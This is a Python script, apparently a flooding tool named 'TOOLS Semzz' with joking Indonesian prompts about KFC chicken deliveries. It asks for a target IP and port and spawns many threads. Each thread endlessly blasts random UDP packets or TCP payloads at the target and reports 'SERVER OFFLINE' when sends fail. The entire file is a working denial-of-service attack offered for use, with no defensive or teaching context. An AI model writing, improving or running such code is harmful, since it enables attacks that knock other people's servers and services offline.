import signal
import random
import socket
import threading
import sys
import os
from os import system, name

os.system("clear")
print("\033[91m TOOLS Semzz")
ip= str(input("\033[95m[ ====> ] HOST/IP : "))
port= int(input("\033[95m[ ====> ] PORT : "))
choice = str(input("\033[95m[ ====> ] GASS YO (y/n) : "))
times= int(input("\033[95m[ ====> ] ISI PAKET AYAM : "))
threads= int(input("\033[95m[ ====> ] ONGKOS KIRIM : "))

def run():
	data = random._urandom(1024)
	i = random.choice(("[×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m PESANAN AYAM KFC DATANG")
		except:
			print("\033[91m [✓] SERVER OFFLINE")

def run2():
	data = random._urandom(16)
	i = random.choice(("[×]","[×]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m PESANAN AYAM KFC DATANG")
		except:
			s.close()
			print("\033[91m [✓] SERVER OFFLINE")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
